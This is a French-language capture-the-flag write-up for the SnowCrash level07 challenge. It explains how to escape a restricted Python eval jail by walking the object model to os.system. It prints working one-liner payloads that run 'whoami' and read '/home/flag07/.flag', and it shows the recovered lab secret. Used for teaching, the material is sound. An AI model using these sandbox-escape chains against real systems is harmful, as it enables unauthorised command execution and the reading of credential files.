# Level07 — Comprendre une prison Python

## Objectif

Comprendre l’introspection Python et pourquoi masquer quelques fonctions ne suffit pas à créer une isolation sûre. Tant que l’interpréteur permet de parcourir son modèle d’objets, des fonctionnalités puissantes peuvent rester accessibles indirectement.

## 1. Identifier l’environnement restreint

L’indice du README est :

```text
You will never escape this
```

Les notes rapportent également la variable suivante :

```text
SHELL=/opt/snowcrash/level07/jail.py
```

Le shell habituel est donc remplacé par un programme Python. Une expression simple permet de confirmer que les entrées sont évaluées :

```python
1 + 1
```

Résultat rapporté :

```text
2
```

Des commandes habituelles et des fonctions comme `dir()` ou `help()` sont en revanche indisponibles. L’environnement n’est pas un shell Bash normal ni un interpréteur Python complet : il évalue certaines expressions dans un espace restreint.

### Limite de traçabilité

Les notes mentionnent `cat README`, `cat .bash_history` et `env`, mais l’archive ne conserve ni le code de `jail.py` ni le contexte précis dans lequel ces commandes ont été exécutées. Cette chronologie doit être clarifiée directement sur la VM pour rendre la découverte entièrement reproductible.

## 2. Comprendre que presque tout est un objet

En Python, une valeur simple est déjà un objet. Par exemple :

```python
(1, 2, 3)
```

Cette valeur est un tuple. Même un tuple vide est un objet :

```python
()
```

Un objet possède une classe et, si l’environnement ne les bloque pas, des attributs permettant d’examiner sa structure.

## 3. Remonter de `tuple` à `object`

La classe du tuple vide est accessible ainsi :

```python
().__class__
```

Résultat :

```text
<class 'tuple'>
```

Examiner ensuite son ordre de résolution des méthodes :

```python
().__class__.__mro__
```

`__mro__` signifie *Method Resolution Order*. Il indique l’ordre dans lequel Python recherche les méthodes dans les classes parentes. Pour `tuple`, on retrouve notamment :

```text
tuple → object
```

L’expression suivante sélectionne donc la classe de base `object` :

```python
().__class__.__mro__[1]
```

## 4. Parcourir les sous-classes chargées

La méthode `__subclasses__()` renvoie les classes directement dérivées d’une classe donnée. Afficher leurs noms permet de rechercher un point d’accès utile :

```python
[c.__name__ for c in ().__class__.__mro__[1].__subclasses__()]
```

Une compréhension de liste est une écriture compacte. Conceptuellement, elle effectue ce traitement :

```python
names = []
for c in classes:
    names.append(c.__name__)
```

Dans le jail du niveau, la liste contient `catch_warnings`. Il est préférable de rechercher cette classe par son nom plutôt que d’utiliser un index numérique, car l’ordre des sous-classes peut changer selon la version de Python et les modules chargés.

## 5. Comprendre le chemin vers le module `os`

La classe `catch_warnings` est intéressante parce que sa méthode `__init__` est une fonction Python dont les variables globales restent accessibles :

| Élément | Rôle |
| --- | --- |
| `__init__` | Méthode d’initialisation de la classe. |
| `__globals__` | Dictionnaire global du module dans lequel cette fonction est définie. |
| `['sys']` | Référence au module `sys` présente dans ces variables globales. |
| `sys.modules` | Dictionnaire des modules déjà chargés par l’interpréteur. |
| `['os']` | Module donnant accès à des fonctions du système d’exploitation. |
| `os.system(...)` | Exécution d’une commande dans un sous-shell. |

Le raisonnement conceptuel est le suivant :

```text
tuple vide
   └─ classe tuple
       └─ classe parente object
           └─ sous-classes chargées
               └─ catch_warnings
                   └─ __init__.__globals__
                       └─ sys.modules['os']
                           └─ system(...)
```

Cette chaîne fonctionne uniquement si les classes et modules nécessaires sont déjà chargés dans l’interpréteur.

## 6. Vérifier l’identité effective

Avant de lire le flag, utiliser le même chemin d’accès pour exécuter `whoami` :

```python
[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'].modules['os'].system('whoami')
```

Résultat rapporté :

```text
flag07
```

Cette vérification distingue deux étapes importantes : obtenir une fonction système, puis confirmer que le processus possède réellement l’identité nécessaire.

## 7. Lire le flag

Remplacer la commande de vérification par la lecture du fichier :

```python
[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.__globals__['sys'].modules['os'].system('cat /home/flag07/.flag')
```

Le secret affiché est :

```text
fiumuikeil8rung8ahcuiperb
```

Aucun fichier n’est créé ou modifié par cette méthode.

## 8. Valider le secret

```bash
ssh -p 4242 level08@localhost
```

Puis vérifier l’identité obtenue :

```bash
id -un
```

Résultat attendu : `level08`. La connexion a réussi avec le secret récupéré, également conservé dans `level07/flag`.

## Pourquoi cette méthode fonctionne

Le jail masque certaines fonctions visibles, mais laisse accessibles `__class__`, `__mro__`, `__subclasses__` et les attributs des fonctions Python. Ces objets permettent de retrouver indirectement un module déjà chargé et d’appeler `os.system`.

Cette expression n’est pas universelle : elle dépend de la version de Python, des classes chargées, des attributs autorisés et de la présence du module `os` dans `sys.modules`. La recherche par nom limite seulement la dépendance à l’ordre des sous-classes.

Une véritable frontière de sécurité ne doit pas reposer sur `eval()` avec une liste incomplète de noms interdits. Il faut définir des opérations autorisées et les exécuter dans une isolation réellement séparée et configurée pour résister à des entrées non fiables.

## À expliquer à l’évaluation

> Le jail retire des fonctions courantes, mais Python permet encore d’examiner les objets chargés. À partir d’un tuple vide, je suis remonté à `object`, puis à ses sous-classes. `catch_warnings` m’a donné accès aux variables globales de son module, puis à `sys.modules['os']`. J’ai d’abord vérifié avec `whoami` que le processus s’exécutait comme `flag07`, puis j’ai lu le flag et validé le résultat avec `level08`.

## Traçabilité et références

Conserver le code de `jail.py`, la chronologie d’accès au README et aux variables d’environnement, les résultats de `1 + 1`, de la liste des sous-classes, de `whoami` et de `id -un`.

Les mécanismes utilisés sont documentés dans le modèle de données Python pour [`type.__subclasses__()`](https://docs.python.org/3/reference/datamodel.html#type.__subclasses__) et [`function.__globals__`](https://docs.python.org/3/reference/datamodel.html#function.__globals__), ainsi que dans la documentation de [`sys.modules`](https://docs.python.org/3/library/sys.html#sys.modules), [`warnings.catch_warnings`](https://docs.python.org/3/library/warnings.html#catch_warnings) et [`os.system`](https://docs.python.org/3/library/os.html#os.system).
